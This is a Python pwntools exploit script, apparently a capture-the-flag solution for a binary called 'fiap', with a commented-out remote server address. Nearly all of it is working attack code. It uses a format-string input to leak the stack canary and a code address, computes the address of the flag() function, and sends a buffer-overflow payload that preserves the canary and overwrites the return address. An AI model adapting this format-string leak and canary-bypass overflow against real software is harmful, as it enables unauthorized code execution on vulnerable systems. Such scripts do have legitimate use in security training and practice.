#!/usr/bin/env python

from pwn import *

exe = ELF("./fiap")
libc = ELF("./libc-2.27.so")
ld = ELF("./ld-2.27.so")

context.binary = exe


def conn():
        return process([ld.path, exe.path], env={"LD_PRELOAD": libc.path})



def main():
    r = conn()

#    r = remote("95.216.233.106", 26913)
    
    r.recvuntil("What\'s your name?\n")
    r.sendline("%11$x %3$x")
    leak = r.recvline().split(" ")
    binary_addr = "0x"+leak[-1][:-2:]
    print "The leak is ", binary_addr
    
    canary = "0x" + leak[-2]

    print "The canary is ", canary

    canary = int(canary,16)

    binary_base = int(binary_addr, 16) - 0x28f
    print "The binary base address is ", hex(binary_base)

    canary_check = binary_base + 0x00014014
    print "stack fail check : ", hex(canary_check)


    flag = binary_base + 0x209

    print "flag() is at ", hex(flag)

    gdb.attach(r)

    payload = "M"*(25) + p32(canary) + "AAAABBBBCCCC" + p32(flag)*10



    r.recvuntil("Would you like some cake?\n")

    r.sendline(payload)

    r.interactive()


if __name__ == "__main__":
    main()
